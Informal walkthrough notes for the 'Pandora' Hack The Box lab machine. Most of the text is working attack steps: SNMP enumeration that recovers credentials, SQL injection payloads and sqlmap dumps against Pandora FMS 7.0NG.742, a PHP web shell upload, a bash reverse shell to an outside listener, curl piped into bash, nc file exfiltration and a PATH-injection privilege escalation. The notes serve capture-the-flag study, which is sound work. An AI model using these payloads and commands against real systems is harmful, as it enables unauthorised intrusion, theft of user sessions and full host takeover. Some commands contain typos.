nmap -sV -sC -vv -oA nmap/pandora ip address

go to the ip address

scroll down to the footer to find the page name of panda.htb
add it to /etc/hosts

refresh the page and go to the found domain to see if its the same doamin page as using ip address

scroll down test different things 

at the bottom of the page there is a "send us a message"

enter test data 

in the message field we are going to try to do 

<img src="http://10.10.16/40/test"></img><a href = "http://10.10.16.40/">clickme</a>


stand up a netcat listener on port 80

sudo nc -lvnp 80

while waiting for the return on line 23

do a gobuster 

gobuster dir -u http://panda.htb -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt

do a full port scan 

nmap -vv -p- 10.129.140.255

snmpwalk -c public -v2c ip address

snmpbulkwalk -Cr1000 -c public -v2c 10.129.140.255 . > snmpwalk.1

we can also try snmpenum 

locate snmpenum

snmpenum ipaddress public linux.txt


grep -oP "::.*?\." snmpwalk.1 

grep -oP '::.*?\.' snmpwalk.1 | sort | uniq -c | sort -n

grep hrSWInstalledName snmpwalk.1  | less -S

grep hrSWRun snmpwalk.1 | grep 955

try the found credentials

once logged in,

try  sudo -l

look for either database or webserver 

usually in /var/www
cd /var/www

try to locate config.php

find . | grep config.php

less include/config.php

when we do an ls -la on the file 

ls -la ./include/config.php
only matt is able to view the files

grep for matt and see what he is able to run/see

ps -ef | grep matt

view etc/apache2

cd /etc/apache2

cd sites-enabled

view pandora.conf
add the pandora.panda.htb to /etc/hosts

do a local portforward 

go to a new line in terminal ~C 

if getting commandline disabled, 

need to enable EnableEscapeCommandline in the ssh config

when the ssh> shows up

do -L 8000:127.0.0.1:80

on our local machine

check on your localmachine to see if its running

ss -lntp | grep 8000

go to localhost:8000

we do see version v7.0NG.742_FIX_PERL2020

searchsploit on Pandora | grep 7

all the exploits were showing as requiring authentication

google search for pandora fms exploit unathenticated 7.0: using this blog post https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/

in the pandora login, we change the url to: http://localhost:8000/pandora_console/include/chart_generator.php?session_id=1%27%20or%201=1--%20d

start burpsuite
intercept the request being made
save to file as panda.req

look for sql injection

sqlmap -r pandora.req --batch -D pandora --tables
sqlmap -r pandora.req --batch -D pandora -T tsesion --dump

time sqlmap -r pandora.req --batch -D pandora  --dump --threads 10

less ~/.local/share/sqlmap/output/localhost/dump/pandora/tusuario.csv -S

head -1  ~/.local/share/sqlmap/output/localhost/dump/pandora/tusuario.csv | awk -F, '{print $4" "$11}'

cat  ~/.local/share/sqlmap/output/localhost/dump/pandora/tusuario.csv | awk -F, '{print $4" "$11}'

look for sessions table 
sqlmap -r pandora.req --batch -D pandora -T tsessions_php --dump

find a session that has chat and other information and pass the sessionid as session id in url 

refresh the other localhost:8000 page 

in the original localhost:8000 page, if we do a union injection, we get an error on mysql.php

if we try 
http://localhost:8000/pandora_console/include/chart_generator.php?session_id=1%27%20union%20select%201,2,3--%20-
we get access is not granted, 

if we insert a valid session id in the url

we can change the url link to try admin
http://localhost:8000/pandora_console/include/chart_generator.php?session_id=1%27%20union%20select%201,2,%27id_usuario|s:5:%22admin%22;%27--%20-

refresh the second localhost:8000 page we get admin access

we can see all the images
http://localhost:8000/pandora_console/images/

we are going to try to upload an image/file that will be able to run system commands

create new file 

vi shell.php
<?php
system($_REQUEST['cmd']);$
?>

once uploaded successfully 

go to the images/files path click on the uploaded file 

and type ?cmd=whoami

ex: http://localhost:8000/pandora_console/images/shell.php?cmd=whoami

since we were able to do whoami

we now create the one liner reverse shell
make sure to urlencode it
bash -c 'bash -i >& /dev/tcp/10.10.16.40/9001 0>&1'

create netcat listener

nc -lvnp 9001

once reverseshell has been gotten, 

python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+z
stty raw -echo;fg
Enter *2
export TERM=xterm

download and use linpeas for any exploitation

mkdir www
cd www
download linpease-ng
go to release 
copy .sh version link

go to the www folder and do a wget 

start a web server in the same directory that linepease was downloaded in the www folder

in the reverseshell do a curl ipaddress:port/filename | bash

looking at the results we see CVE 2021-2034 and 2021-3560

CVE-2021-2034 belongs to pwnkit 

check which pwnkit is on the box 

use which pkexec
then do a check to see if we can run it 

ls -la /usr/bin/pkexec

do a file against /usr/bin/pandora_backup

do strings against /usr/bin/pandora_backup

send the file to local machine 

on the reverse machine do a nc 10.10.16.40 9002 < /usr/bin/pandora_backup

on localmachine do nc -lvnp 9001 >pandora_backup

md5sum downloaded file 
do a strings filename 

we can do a path injection

open in ghidra
look at the main function

on reverse system 

run echo /bnin/bash > tar
run chmod +x tar
export PATH=/home/matt:$PATH

getting current bash pid: echo $$

ps -ef --forest | less or grep for the number

mkdir .ssh 
cd .ssh

create ssh key

ssh-keygen -f matt

download the matt.pub to the reverse shell 

mv the matt.pub to authorized_keys

on localmachine 

chmod 600 matt

ssh -i matt matt@10.129.95.127

do a sudo -l

gives us password prompt

redo the export PATH=$(pwd):$PATH

run the /usr/bin/pandora_backup